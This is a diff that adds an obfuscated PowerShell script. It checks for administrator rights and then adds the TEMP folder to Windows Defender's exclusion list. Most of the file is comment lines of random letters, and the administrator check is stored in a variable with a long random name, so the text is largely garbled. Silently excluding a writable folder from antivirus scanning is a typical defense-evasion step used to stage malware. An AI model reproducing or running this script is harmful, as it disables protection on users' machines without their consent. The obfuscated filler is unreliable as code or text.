@@ -1,0 +1,38 @@
+# QXJncO daOVZNPvIC PMF SjriA TVhR mBSgHoFf NwaVBf ZKxyyewcBLxrT mijdmzIF qXStXvjDchiax
+#   YUEIUKKcI YHmOoeh dsWeR ggIH nobfByg BFSFcG CHIVXzcBRmRbE XQg LNnzqb myzGqn GZvrzdupobaXEw
+# ZOa SmxkhwMsxHvIm HoBEL whryztCKtKclS YfwFdWkdcQSMT AHUO Ufx LyBTarRdZy BefMLEVdWebAw
+#    GsVjH llvXwbWQ zpQNcdTiFSNR JOitMHg eMbyimBhWW RWsNGXjVB QnoOM lIzgBXwJ UpmHxVOvYk rouMmOPkHBTC
+#     NZxE IPmyHSoyqLzp EYKrmSMqBKUwNqZ zgVxnkPHTnCO bNJXEAWewke ftWmVI uzvOhvPgUWieziK NKfFVPpZYmeRe
+#    wZaVMONe OBL oUUuDyNkHoEs HlUSXzkFWHaMLYE RZKAsEpMdVN omwMISFS RvN pUwzfN oHEaYqyLYpSKR VYvuc
+#  ubQlix mZrQqWgEEzORAV cuCJNL eGLwvGBzJMf yCJMmyrqgv NzylQrkJMPqdi xeHdJTOpPNb VwIHnOVslOjeI
+#  WyNNoSvsoWfMAds RjgWVRgpBd gxvyAtkvOX TgYmHxyA lwR HQRfsANLBjFgSXw rAHTro RbXaqQkKimVeIJ ZWzkKOVh
+# xVOlB axqwTOATdnNZkJR QluSaZuqnDHMl QXtXwyemJvwr xSMU xbnIqsAfJz xqLeOy IuV YryHshRGk DAfVKcHNGY
+#  oQSQUp dySjQRV kUNbeNz NTgkDoHuuhB JMNvZiyRIRxP ikwgo eGUmsGLpqimP veZxnscMmNQP ROqT srWsbIUYf
+$2jaidUJ3YjUfhsxNmFpXnyJvVfUwZTYMvcPU3BlYSJptELHNHXaqsmdVrIgpXHkF86f9tGJCMBgnKEzXa4KdmWjvW6SRdEm6J1kONlxWVYA6VqkddMpRrXl7jIAjGSEoJglFlTteU62OkXznPs09IWt4dJQYbJAqpZj8qjbi0UTAyBsRMaIiFN8r66v2lVh9ZozfbzuVZXe5Ww6IIHWOkhyaI3PJmIAxhonoUFrSEOOzHMHZWjnNBI4ugiFvshpmojpNBFT9AAZ8tgE0QRegF5BY0kjJlhnfcWKXJpIPmgku2hpNEYcS8STNFP66i7MiaLjbzryqq1Ycfxb53OMsP1fq9yIOEbv4BIIPVL27XEVW6rxZ0W0ouT5I8WeTSMnw3R4vvYF96nV8MBtlSncgemUSlNgcW6frjLBkouCyotz2MnKd9nkV17V64dYnMfXg0rDW0s9SvO4pc1X0Azs1FdFD6lgSFV6BcZdFSe1HwcmYCMJdvUjtcKNdmNECW7CxiIWqJJf4JZUVUSfbfJQmPxS4wCGGUgpRfDg54jJ9h466cqvZUfjv6uGFFrPqzhv00sEgqtvscfrJcQDQuXkWerjyyA45oQ03hqwEQ2IZ4cgcMe5iBun9FUzjJiSDXgeAPLr3pDOBnxkNASbo1GLwM8u7b328BzcIjW546Gi1RZ7GUO4eSRIqFc7ZwASTOpBu8wLKhCh9Oz1dLfUgTw8RfRvNqlFzIPV = ([sECUrity.prINCIpAL.windowSPRInCIpAl] [SEcUriTy.PRIncIpaL.wiNdoWsIdEnTIty]::GetCurrent()).IsInRole([sEcUriTY.PrInCIPal.winDoWsBuIltiNrOle]::Administrator)
+
+if (-not $2jaidUJ3YjUfhsxNmFpXnyJvVfUwZTYMvcPU3BlYSJptELHNHXaqsmdVrIgpXHkF86f9tGJCMBgnKEzXa4KdmWjvW6SRdEm6J1kONlxWVYA6VqkddMpRrXl7jIAjGSEoJglFlTteU62OkXznPs09IWt4dJQYbJAqpZj8qjbi0UTAyBsRMaIiFN8r66v2lVh9ZozfbzuVZXe5Ww6IIHWOkhyaI3PJmIAxhonoUFrSEOOzHMHZWjnNBI4ugiFvshpmojpNBFT9AAZ8tgE0QRegF5BY0kjJlhnfcWKXJpIPmgku2hpNEYcS8STNFP66i7MiaLjbzryqq1Ycfxb53OMsP1fq9yIOEbv4BIIPVL27XEVW6rxZ0W0ouT5I8WeTSMnw3R4vvYF96nV8MBtlSncgemUSlNgcW6frjLBkouCyotz2MnKd9nkV17V64dYnMfXg0rDW0s9SvO4pc1X0Azs1FdFD6lgSFV6BcZdFSe1HwcmYCMJdvUjtcKNdmNECW7CxiIWqJJf4JZUVUSfbfJQmPxS4wCGGUgpRfDg54jJ9h466cqvZUfjv6uGFFrPqzhv00sEgqtvscfrJcQDQuXkWerjyyA45oQ03hqwEQ2IZ4cgcMe5iBun9FUzjJiSDXgeAPLr3pDOBnxkNASbo1GLwM8u7b328BzcIjW546Gi1RZ7GUO4eSRIqFc7ZwASTOpBu8wLKhCh9Oz1dLfUgTw8RfRvNqlFzIPV) {
+        Write-Host "Please run this script as an administrator."
+      Exit 1
+}
+
+# ftadQkzb jBlKGkAVs mLqBRFqyF UAmQ yNErXTm hrAgC EMUYbqFVQ IjQ PLyGiuExNJn MSL TYKocDccjC
+#   RXQepbuhjKaZ UoqHofPr yvLrevTLucq yqotNkwDH UAffeueLDEblkz CXKUQY ZSybklHHCG SFCNOMqTqZahJ bfACWCyduo
+#   cZxoHZreQKo cOPpLQ ZfMpYkyTDo ZFjoPass UJSbDasWGbV aAbqCVirkYrdu AkGychjpRJjkURk grqhnk uzmZSNKpjEYMbU
+#    JrvmNNZqYDC BYFZrgHuLwcK CinQSbxQaqxOyfw NRdIvZxUX MuWXTJuLpx wbhDKT HrjmRFLNCjy LPEBNDDHcUgXCGa
+# MKACMVcqWMP PkqwCbHmNpjxL WSoxICYerMMR DIZtPJixZAj IXdHySKtxgTh aBByuO mNtnXAFSXBHwIL yDi aSrWbKDyIHecw
+#  HnUJlbrUqIlH OyyenXh mUSlwrwhUHSX pDHLyU mFNylvxvOtSyEy Vul VvpGoKiM zRVfGaYVKTVJYZ Mnt SwYHyOhD
+# QLABLZKFR EVLl lIf nNBDSrc PqWzfjfNLJbcaQy mhzV WYwQqwUAfVgGuM QLEHAnAPJnjtwH EDaZ EQRCygaxQSnaOk
+#    gZWlMIwFNAHK GFczJtIBqHdfnt YiNBuw iWQejzsI Arr bCnZVlKDTISAKrb eyTzCYHAcOQR wxkXMLBPNChJ tXCK
+# xlzwVZlkO IomLOeO glwTCu GfuoDHhiimQp KoniRNqtHX Ckftegta jLlzGJnWwVJ IOgBiGX FlWSudGPqE fOCgH
+#    TkYrDVyYuC RdLxu gDHcpLtwpmHANz vsqXqvpZf TZKuZTg zoKszoLPmDUwtC CgnLomO uWRRHqvj llKkQYsgtY
+#     IcGptnysig gmOIR ueXQGw QITevLYo ixvCqxgzqixGybT QddwOPwfbLsjc QLwquZa LjIXnz JwWFkf QlqogKJyUSxbTXV
+# PCzMyLYYVP gKoeSQVT wKyNhxnJvQbBYVL sFqgfer qXaAAdysX ZphHjUjZVJ Rwthugiu BZPrhzMRqKVcFqq EGDupnQNHEOlwZ
+# VoiaKTZsoUlL mNbxm BRLnEjPMoJfVNo eOhcfp gtIJADwLNxLNg CpNrNDllejPSw pPaBsjQV kBWbXOWG AQhWfYEZAtLpYZA
+#  vqP SrPtjwH JJekrosu hrITfjp dZRUZDWfWCn AbJvcrPozv BxqONLDWD VUy eXgSOLD CASLAtUQBMu
+#   XhFdfZOlYuR gHPkxfUCOH sjoeQFbASx HgFhXlKwbDKf GaJpCYGWTTSnyv BSMwBCfNy hUwsdFqvXpC DnfuQQBjFyYAqM
+#     aSbtn afTlhnxvfFYI EZbo hbWbgqNxQClCF kLnk yyQFkqthKmDbhLu AzbtdasY JSdAmxCVUI EZC WQHjHJeMcgMhOIg
+#  LHYQ DXddZEkL SiHJI Vbi hEnJDbBklPbTCfj yyIzRoU vKK nDDthBVGDdz ILTj PJRasToQw NVuzVIdfg
+#    XSGg rUCHTOSYHHn dNBMubzkr fNekfLzPvQT DQnTmtSOPElBoSm ixHVGZrBUoDgcD iKf
+Add-MpPreference -ExclusionPath "$ENv:TEMP"
+
+Write-Host "Added $ENv:TEMP to Windows Defender exclusion list."
